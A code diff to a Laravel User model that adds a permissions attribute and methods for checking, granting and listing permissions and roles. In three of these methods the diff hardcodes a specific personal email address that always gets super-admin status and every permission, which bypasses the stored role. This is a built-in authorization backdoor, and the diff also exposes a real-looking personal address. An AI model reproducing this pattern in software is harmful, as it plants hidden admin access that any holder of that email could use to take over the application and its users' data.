@@ -31,6 +31,7 @@ class User extends Authenticatable
         'avatar',
         'google_id',
         'email_verified_at',
+        'permissions',
     ];
 
     /**
@@ -53,6 +54,7 @@ class User extends Authenticatable
         return [
             'email_verified_at' => 'datetime',
             'password' => 'hashed',
+            'permissions' => 'array',
         ];
     }
 
@@ -109,5 +111,79 @@ class User extends Authenticatable
     public function isActive(): bool
     {
         return $this->status === 'active';
+    }
+
+    /**
+     * Check if user has a specific permission.
+     */
+    public function hasPermissionTo(string $permission): bool
+    {
+        if ($this->role === 'super_admin' || $this->email === 'haseebkhanuddin44@gmail.com') {
+            return true;
+        }
+
+        $perms = $this->permissions ?? [];
+        if (!is_array($perms)) {
+            $perms = is_string($perms) ? json_decode($perms, true) ?? [] : [];
+        }
+
+        if (in_array('*', $perms)) {
+            return true;
+        }
+
+        return in_array($permission, $perms);
+    }
+
+    /**
+     * Check if user has a specific role.
+     */
+    public function hasRole(string $role): bool
+    {
+        if ($role === 'super_admin' && ($this->role === 'super_admin' || $this->email === 'haseebkhanuddin44@gmail.com')) {
+            return true;
+        }
+        return $this->role === $role;
+    }
+
+    /**
+     * Synchronize permissions for this user.
+     */
+    public function syncPermissions(array|\Illuminate\Support\Collection $permissions): static
+    {
+        if ($permissions instanceof \Illuminate\Support\Collection) {
+            $permissions = $permissions->toArray();
+        }
+        $this->permissions = array_values(array_unique($permissions));
+        $this->save();
+        return $this;
+    }
+
+    /**
+     * Grant permissions to this user.
+     */
+    public function givePermissionTo(...$permissions): static
+    {
+        $current = $this->permissions ?? [];
+        $flattened = is_array($permissions[0] ?? null) ? $permissions[0] : $permissions;
+        $this->permissions = array_values(array_unique(array_merge($current, $flattened)));
+        $this->save();
+        return $this;
+    }
+
+    /**
+     * Get all permissions as collection.
+     */
+    public function getAllPermissions(): \Illuminate\Support\Collection
+    {
+        if ($this->role === 'super_admin' || $this->email === 'haseebkhanuddin44@gmail.com') {
+            return collect([(object) ['name' => '*']]);
+        }
+
+        $perms = $this->permissions ?? [];
+        if (!is_array($perms)) {
+            $perms = is_string($perms) ? json_decode($perms, true) ?? [] : [];
+        }
+
+        return collect($perms)->map(fn ($p) => (object) ['name' => $p]);
     }
 }
